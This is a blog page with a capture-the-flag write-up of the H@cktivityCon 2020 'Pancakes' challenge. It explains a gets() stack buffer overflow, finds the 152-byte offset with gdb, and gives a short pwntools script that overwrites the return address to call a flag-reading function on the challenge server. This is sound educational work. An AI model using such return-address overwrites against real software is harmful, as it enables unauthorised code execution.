@@ -1,0 +1,356 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  <title>nullarmor | H@cktivityCon CTF 2020 - Pancakes</title>
+  <meta name="description" content="Resolution of the H@cktivityCon CTF challenge named Pancakes">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <meta property="og:title" content="H@cktivityCon CTF 2020 - Pancakes">
+  <meta property="og:type" content="website">
+  <meta property="og:url" content="https://nullarmor.github.io/posts/hacktivitycon-pancakes">
+  <meta property="og:description" content="Resolution of the H@cktivityCon CTF challenge named Pancakes">
+  <meta property="og:site_name" content="nullarmor">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:url" content="https://nullarmor.github.io/posts/hacktivitycon-pancakes">
+  <meta name="twitter:title" content="H@cktivityCon CTF 2020 - Pancakes">
+  <meta name="twitter:description" content="Resolution of the H@cktivityCon CTF challenge named Pancakes">
+  <meta name="google-site-verification" content="1sfOj2zDu7c444806MBQqbqFzNWxik880zgryQLMj-o" />
+
+  
+    
+      <meta property="og:image" content="https://nullarmor.github.io/assets/ctf/hacktivitycon/2020/pancakes/pancakes-00-d0dec170973f53d2a71e9f173a780fa9ef2e59e359d011557fb770a7d4c2be42.jpg">
+      <meta name="twitter:image" content="https://nullarmor.github.io/assets/ctf/hacktivitycon/2020/pancakes/pancakes-00-d0dec170973f53d2a71e9f173a780fa9ef2e59e359d011557fb770a7d4c2be42.jpg">
+    
+  
+
+  <link href="https://nullarmor.github.io/feed.xml" type="application/rss+xml" rel="alternate" title="nullarmor Last 10 blog posts" />
+
+  
+
+  
+
+    
+      <link rel="icon" type="image/x-icon" href="/assets/favicon-5df081ea197cddd592e345971da85e359e2f613dae2506c368835a695a297f82.gif">
+      <link rel="apple-touch-icon" href="/assets/favicon-5df081ea197cddd592e345971da85e359e2f613dae2506c368835a695a297f82.gif">
+      <link rel="stylesheet" type="text/css" title="light" id="light" href="/assets/light-fd3e34295723b96a04f635903b3650e5bb101ebdcc4d959165c3b4d2d88abe5e.css">
+      <link rel="stylesheet" type="text/css" title="dark" id="dark" href="/assets/dark-0f2545b8bdef934d32dd563b17074c614e7f4f4d5c3e682d4089a07fed36aa84.css" disabled="false">
+    
+
+  
+
+</head>
+
+<body>
+  <main>
+    <div class="grid grid-centered">
+      <div class="grid-cell">
+        <nav class="header-nav scrollappear">
+  <a href="/" class="header-logo" title="nullarmor">nullarmor</a>
+  <ul class="header-links">
+    
+      <li>
+        <a href="/about" title="About me">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-about">
+  <use href="/assets/about-ecf154b571ab8034ae00aeed91a3b7ad68db80b46d958753ad6216c919486e88.svg#icon-about" xlink:href="/assets/about-ecf154b571ab8034ae00aeed91a3b7ad68db80b46d958753ad6216c919486e88.svg#icon-about"></use>
+</svg>
+
+        </a>
+      </li>
+    
+    
+      <li>
+        <a href="https://twitter.com/nullarmor" rel="noreferrer noopener" target="_blank" title="Twitter">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-twitter">
+  <use href="/assets/twitter-8842c33965263ad1b03a978406826677a668f94125d5837e70ab83f24b3213a7.svg#icon-twitter" xlink:href="/assets/twitter-8842c33965263ad1b03a978406826677a668f94125d5837e70ab83f24b3213a7.svg#icon-twitter"></use>
+</svg>
+
+        </a>
+      </li>
+    
+    
+    
+    
+      <li>
+        <a href="https://github.com/nullarmor" rel="noreferrer noopener" target="_blank" title="GitHub">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-github">
+  <use href="/assets/github-094f81040819f34343ee6ffff0980f17e2807b08b595eaaf66ae3554934fd78d.svg#icon-github" xlink:href="/assets/github-094f81040819f34343ee6ffff0980f17e2807b08b595eaaf66ae3554934fd78d.svg#icon-github"></use>
+</svg>
+
+        </a>
+      </li>
+    
+    
+    
+    
+    
+    
+    
+      <li>
+        <a href="https://www.linkedin.com/in/renan-almeida-8137a81a6" rel="noreferrer noopener" target="_blank" title="LinkedIn">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-linkedin">
+  <use href="/assets/linkedin-cdc5c107044324a3dfbea2e9ead15873f8dee304c37d73a046988956b706256e.svg#icon-linkedin" xlink:href="/assets/linkedin-cdc5c107044324a3dfbea2e9ead15873f8dee304c37d73a046988956b706256e.svg#icon-linkedin"></use>
+</svg>
+
+        </a>
+      </li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+      <li>
+        <a href="mailto:nullarmor@protonmail.com" title="Email">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-email">
+  <use href="/assets/email-782473193bf750036fdb90e8daa075508a20509d01854c09f3237c144a3f0601.svg#icon-email" xlink:href="/assets/email-782473193bf750036fdb90e8daa075508a20509d01854c09f3237c144a3f0601.svg#icon-email"></use>
+</svg>
+
+        </a>
+      </li>
+    
+    
+    
+      <li>
+        <a onclick="toggle()" title="Toggle Theme">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-theme">
+  <use href="/assets/theme-66869e0bf8dab34bae1c86bda400327b772e0be69e8dc28d3ede896e771320ed.svg#icon-theme" xlink:href="/assets/theme-66869e0bf8dab34bae1c86bda400327b772e0be69e8dc28d3ede896e771320ed.svg#icon-theme"></use>
+</svg>
+
+        </a>
+      </li>
+    
+  </ul>
+</nav>
+
+
+  <ul class="header-tags scrollappear">
+    
+    
+      
+        <li><a href="/tag/ctf">Ctf</a></li>
+    
+      
+        <li><a href="/tag/cybrics">Cybrics</a></li>
+    
+      
+        <li><a href="/tag/hackthebox">Hackthebox</a></li>
+    
+      
+        <li><a href="/tag/hacktivitycon">Hacktivitycon</a></li>
+    
+      
+        <li><a href="/tag/pwn">Pwn</a></li>
+    
+      
+        <li><a href="/tag/rev">Rev</a></li>
+    
+      
+        <li><a href="/tag/rgbctf">Rgbctf</a></li>
+    
+      
+        <li><a href="/tag/web">Web</a></li>
+    
+  </ul>
+
+
+        <article class="article scrollappear">
+          <header class="article-header">
+            <h1>H@cktivityCon CTF 2020 - Pancakes</h1>
+            <p>Resolution of the H@cktivityCon CTF challenge named Pancakes</p>
+            <div class="article-list-footer">
+  <span class="article-list-date">
+    July 31, 2020
+  </span>
+  <span class="article-list-divider">-</span>
+  <span class="article-list-minutes">
+    
+    
+      3 minute read
+    
+  </span>
+  <span class="article-list-divider">-</span>
+  <div class="article-list-tags">
+    
+      
+      <a href="/tag/ctf" title="See all posts with tag 'Ctf'">Ctf</a>
+    
+      
+      <a href="/tag/pwn" title="See all posts with tag 'Pwn'">Pwn</a>
+    
+      
+      <a href="/tag/hacktivitycon" title="See all posts with tag 'HacktivityCon'">HacktivityCon</a>
+    
+  </div>
+</div>
+          </header>
+
+          <div class="article-content">
+            <p><a href="/assets/ctf/hacktivitycon/2020/pancakes/pancakes-00-d0dec170973f53d2a71e9f173a780fa9ef2e59e359d011557fb770a7d4c2be42.jpg">
+  <img src="/assets/ctf/hacktivitycon/2020/pancakes/pancakes-00-d0dec170973f53d2a71e9f173a780fa9ef2e59e359d011557fb770a7d4c2be42.jpg" alt="CTF Challenge Banner" class="zooming" data-rjs="/assets/ctf/hacktivitycon/2020/pancakes/pancakes-00-d0dec170973f53d2a71e9f173a780fa9ef2e59e359d011557fb770a7d4c2be42.jpg" data-zooming-width="598" data-zooming-height="380" />
+</a></p>
+
+<p><code class="highlighter-rouge">Pancakes</code> was a very easy pwn challenge, there’s nothing special about this challenge but for someone that is starting to pwn it’s a good lesson.</p>
+
+<p>The challenge had the following description/details:</p>
+
+<p><a href="/assets/ctf/hacktivitycon/2020/pancakes/pancakes-01-656666c082131c7d45390ad51811c3f8795fbfa1937efede8fb95c1b62eccecc.png">
+  <img src="/assets/ctf/hacktivitycon/2020/pancakes/pancakes-01-656666c082131c7d45390ad51811c3f8795fbfa1937efede8fb95c1b62eccecc.png" alt="CTF Challenge Description" class="zooming" data-rjs="/assets/ctf/hacktivitycon/2020/pancakes/pancakes-01-656666c082131c7d45390ad51811c3f8795fbfa1937efede8fb95c1b62eccecc.png" data-zooming-width="498" data-zooming-height="451" />
+</a></p>
+
+<p>A copy of the original binary provided by the challenge is available on: <a href="https://mega.nz/file/NQgF1TrQ#Tq4lagv79ZiOz9hSYPrnlVdWUKn56jl_lZcc-hbWrKE">pancakes</a></p>
+
+<p>When running the binary we got a program with user input:</p>
+
+<p><a href="/assets/ctf/hacktivitycon/2020/pancakes/pancakes-02-64a18d4506bd017300925e44f8525b652aa3fa02684b7b823e2c12f51ad5b49a.png">
+  <img src="/assets/ctf/hacktivitycon/2020/pancakes/pancakes-02-64a18d4506bd017300925e44f8525b652aa3fa02684b7b823e2c12f51ad5b49a.png" alt="CTF Binary" class="zooming" data-rjs="/assets/ctf/hacktivitycon/2020/pancakes/pancakes-02-64a18d4506bd017300925e44f8525b652aa3fa02684b7b823e2c12f51ad5b49a.png" data-zooming-width="626" data-zooming-height="350" />
+</a></p>
+
+<p>Let’s check the binary protection using <code class="highlighter-rouge">checksec</code>:</p>
+
+<p><a href="/assets/ctf/hacktivitycon/2020/pancakes/pancakes-03-2b7af2770ef599c421bacb947bc8823e1ab3e29beed3baba41485dc767e400b8.png">
+  <img src="/assets/ctf/hacktivitycon/2020/pancakes/pancakes-03-2b7af2770ef599c421bacb947bc8823e1ab3e29beed3baba41485dc767e400b8.png" alt="CTF Binary Protections" class="zooming" data-rjs="/assets/ctf/hacktivitycon/2020/pancakes/pancakes-03-2b7af2770ef599c421bacb947bc8823e1ab3e29beed3baba41485dc767e400b8.png" data-zooming-width="628" data-zooming-height="124" />
+</a></p>
+
+<p>After opening the binary to be decompiled by <code class="highlighter-rouge">Ghidra</code>, we got the <code class="highlighter-rouge">main function</code> with the following code:</p>
+
+<p><a href="/assets/ctf/hacktivitycon/2020/pancakes/pancakes-04-4f8f392e3c11f22fbca2dcd0592cfe0894e9ca9e48a168e5eb7f6c92f709ac41.png">
+  <img src="/assets/ctf/hacktivitycon/2020/pancakes/pancakes-04-4f8f392e3c11f22fbca2dcd0592cfe0894e9ca9e48a168e5eb7f6c92f709ac41.png" alt="CTF Binary Decompiled" class="zooming" data-rjs="/assets/ctf/hacktivitycon/2020/pancakes/pancakes-04-4f8f392e3c11f22fbca2dcd0592cfe0894e9ca9e48a168e5eb7f6c92f709ac41.png" data-zooming-width="672" data-zooming-height="881" />
+</a></p>
+
+<p>We noticed that the buffer named <code class="highlighter-rouge">local_98</code> receives the user’s input through <code class="highlighter-rouge">gets()</code>, this can lead to a classical <code class="highlighter-rouge">buffer overflow</code>.</p>
+
+<p>I found that the program crashes with <code class="highlighter-rouge">152</code> characters, to achieve this number I just calculated the distance between two memory addresses using <code class="highlighter-rouge">gdb with gef</code>:</p>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell">disas main</code></pre></figure>
+
+<p><a href="/assets/ctf/hacktivitycon/2020/pancakes/pancakes-05-61baab19591723560df23acc4b63564d918e89d10f89053889a062dcce6262df.png">
+  <img src="/assets/ctf/hacktivitycon/2020/pancakes/pancakes-05-61baab19591723560df23acc4b63564d918e89d10f89053889a062dcce6262df.png" alt="CTF Binary Main Function" class="zooming" data-rjs="/assets/ctf/hacktivitycon/2020/pancakes/pancakes-05-61baab19591723560df23acc4b63564d918e89d10f89053889a062dcce6262df.png" data-zooming-width="832" data-zooming-height="873" />
+</a></p>
+
+<p>Put a breakpoint in the <code class="highlighter-rouge">leave</code> instruction:</p>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell">b <span class="k">*</span>main+418</code></pre></figure>
+
+<p>Run the program and send an input with a recognizable number to search using the gef module named <code class="highlighter-rouge">search-pattern</code>.</p>
+
+<p><a href="/assets/ctf/hacktivitycon/2020/pancakes/pancakes-06-5a6a9a55fdaa6432edd9169fb9b4bf82160eb5c082a699304201ac4551f784e5.png">
+  <img src="/assets/ctf/hacktivitycon/2020/pancakes/pancakes-06-5a6a9a55fdaa6432edd9169fb9b4bf82160eb5c082a699304201ac4551f784e5.png" alt="CTF Binary Exploit" class="zooming" data-rjs="/assets/ctf/hacktivitycon/2020/pancakes/pancakes-06-5a6a9a55fdaa6432edd9169fb9b4bf82160eb5c082a699304201ac4551f784e5.png" data-zooming-width="832" data-zooming-height="453" />
+</a></p>
+
+<p><a href="/assets/ctf/hacktivitycon/2020/pancakes/pancakes-07-bfae1fa21c5326cb3f41c48e5778b8794e5589f2b95eb120d639df5896db814c.png">
+  <img src="/assets/ctf/hacktivitycon/2020/pancakes/pancakes-07-bfae1fa21c5326cb3f41c48e5778b8794e5589f2b95eb120d639df5896db814c.png" alt="CTF Binary Exploit" class="zooming" data-rjs="/assets/ctf/hacktivitycon/2020/pancakes/pancakes-07-bfae1fa21c5326cb3f41c48e5778b8794e5589f2b95eb120d639df5896db814c.png" data-zooming-width="1163" data-zooming-height="979" />
+</a></p>
+
+<p>So now we got two interesting memory addresses, <code class="highlighter-rouge">0x7fffffffe4f8</code> and <code class="highlighter-rouge">0x7fffffffe460</code>, to get the space between them we just need to subtract them:</p>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell">python2 <span class="nt">-c</span> <span class="s2">"print(hex(0x7fffffffe4f8 - 0x7fffffffe460))"</span></code></pre></figure>
+
+<p>The result is <code class="highlighter-rouge">0x98</code> or <code class="highlighter-rouge">152</code> in decimal. So now we know how many characters before crash the program through the input.</p>
+
+<p>There’s a function named <code class="highlighter-rouge">secret_recipe</code> that opens the <code class="highlighter-rouge">flag.txt</code> file:</p>
+
+<p><a href="/assets/ctf/hacktivitycon/2020/pancakes/pancakes-09-89b47043e89afd50052c71af74cc149ceb1d17be983da6052a418d7b43fe8265.png">
+  <img src="/assets/ctf/hacktivitycon/2020/pancakes/pancakes-09-89b47043e89afd50052c71af74cc149ceb1d17be983da6052a418d7b43fe8265.png" alt="CTF Binary Exploit" class="zooming" data-rjs="/assets/ctf/hacktivitycon/2020/pancakes/pancakes-09-89b47043e89afd50052c71af74cc149ceb1d17be983da6052a418d7b43fe8265.png" data-zooming-width="671" data-zooming-height="333" />
+</a></p>
+
+<p>To call this function we need to find the <code class="highlighter-rouge">secret_recipe</code>’s function address:</p>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell">readelf <span class="nt">-a</span> pancakes | <span class="nb">grep </span>secret_recipe</code></pre></figure>
+
+<blockquote>
+  <p><code class="highlighter-rouge">    53: 000000000040098b   113 FUNC    GLOBAL DEFAULT   13 secret_recipe</code></p>
+</blockquote>
+
+<p>The function <code class="highlighter-rouge">secret_recipe</code> is located at <code class="highlighter-rouge">0x40098b</code></p>
+
+<p>Done, I wrote a small exploit to capture the flag:</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c1"># -*- coding:utf-8 -*-
+</span>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+
+<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+    <span class="n">proc</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">"jh2i.com"</span><span class="p">,</span> <span class="mi">50021</span><span class="p">)</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="s">"0"</span> <span class="o">*</span> <span class="mh">0x98</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x40098b</span><span class="p">)</span>
+    <span class="n">proc</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+    <span class="n">proc</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>
+    <span class="n">main</span><span class="p">()</span></code></pre></figure>
+
+<p><a href="/assets/ctf/hacktivitycon/2020/pancakes/pancakes-08-266e0499d8f1fa2d2786e5d6ff087b2147f0803c690a543a46cc96b5a1a73c00.png">
+  <img src="/assets/ctf/hacktivitycon/2020/pancakes/pancakes-08-266e0499d8f1fa2d2786e5d6ff087b2147f0803c690a543a46cc96b5a1a73c00.png" alt="CTF Binary Exploit" class="zooming" data-rjs="/assets/ctf/hacktivitycon/2020/pancakes/pancakes-08-266e0499d8f1fa2d2786e5d6ff087b2147f0803c690a543a46cc96b5a1a73c00.png" data-zooming-width="652" data-zooming-height="469" />
+</a></p>
+
+<blockquote>
+  <p>flag{too_many_pancakes_on_the_stack}</p>
+</blockquote>
+
+<p>xD</p>
+
+          </div>
+          <div class="article-share">
+            
+            
+            <a href="https://twitter.com/home?status=H@cktivityCon+CTF+2020+-+Pancakes%20-%20https://nullarmor.github.io/posts/hacktivitycon-pancakes%20by%20@nullarmor" title="Share on Twitter" rel="noreferrer noopener" target="_blank">
+              <svg viewBox="0 0 512 512"><path d="M492 109.5c-17.4 7.7-36 12.9-55.6 15.3 20-12 35.4-31 42.6-53.6 -18.7 11.1-39.4 19.2-61.5 23.5C399.8 75.8 374.6 64 346.8 64c-53.5 0-96.8 43.4-96.8 96.9 0 7.6 0.8 15 2.5 22.1 -80.5-4-151.9-42.6-199.6-101.3 -8.3 14.3-13.1 31-13.1 48.7 0 33.6 17.2 63.3 43.2 80.7C67 210.7 52 206.3 39 199c0 0.4 0 0.8 0 1.2 0 47 33.4 86.1 77.7 95 -8.1 2.2-16.7 3.4-25.5 3.4 -6.2 0-12.3-0.6-18.2-1.8 12.3 38.5 48.1 66.5 90.5 67.3 -33.1 26-74.9 41.5-120.3 41.5 -7.8 0-15.5-0.5-23.1-1.4C62.8 432 113.7 448 168.3 448 346.6 448 444 300.3 444 172.2c0-4.2-0.1-8.4-0.3-12.5C462.6 146 479 129 492 109.5z"/></svg>
+            </a>
+            <a href="https://www.facebook.com/sharer/sharer.php?u=https://nullarmor.github.io/posts/hacktivitycon-pancakes" title="Share on Facebook" rel="noreferrer noopener" target="_blank">
+              <svg viewBox="0 0 512 512"><path d="M288 192v-38.1c0-17.2 3.8-25.9 30.5-25.9H352V64h-55.9c-68.5 0-91.1 31.4-91.1 85.3V192h-45v64h45v192h83V256h56.4l7.6-64H288z"/></svg>
+            </a>
+          </div>
+
+          
+            <div id="disqus_thread" class="article-comments"></div>
+            <script src="https://nullarmor.disqus.com/embed.js" async defer></script>
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+          
+        </article>
+        <footer class="footer scrollappear">
+  <p>
+    This site uses Chalk theme made by Nielsen Ramon.
+  </p>
+</footer>
+
+      </div>
+    </div>
+  </main>
+  
+  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-159304176-1"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+    gtag('config', 'UA-159304176-1');
+  </script>
+
+
+<script type="text/javascript" src="/assets/vendor-2c224c53eb697c739f9490c38819a72184f09472739fd9e492272ef174090428.js"></script>
+
+
+  <script type="text/javascript" src="/assets/webfonts-96493456d319d1bf419afdf8701552d4d486fee6afd304897d4fd81eb4e0cc0b.js"></script>
+
+
+
+  <script type="text/javascript" src="/assets/scrollappear-e2da8ea567e418637e31266cc5302126eaa79f62a2273739086358b589a89ee6.js"></script>
+
+
+<script type="text/javascript" src="/assets/application-cfde13ac81ddaf4351b2e739603e2baf688d0fcc9aba613fe62bbb1c7b037fb9.js"></script>
+
+
+  <script type="text/javascript" src="/assets/themetoggle-df0d3d73164dc26dffbd630182ae4d0dfa7bee6b694a2b5d565d73595b582bbf.js"></script>
+
+</body>
+</html>
